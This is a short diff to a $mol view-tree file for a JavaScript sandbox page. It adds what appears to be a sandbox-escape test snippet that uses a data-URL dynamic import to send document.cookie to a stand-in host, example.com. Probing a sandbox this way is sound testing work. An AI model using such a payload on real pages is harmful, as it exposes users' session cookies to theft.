@@ -395,6 +395,9 @@ $hyoo_js_sandbox $mol_page
 		\
 			\sin.call = ()=> 0
 			\return sin.call
+		\
+			\let script = 'location = "https://example.com/" + document.cookie'
+			\return import(`data:text/javascript;charset=utf-8,${script}`)
 
 $hyoo_js_sandbox_snippet $mol_link
 	arg * script <= code \
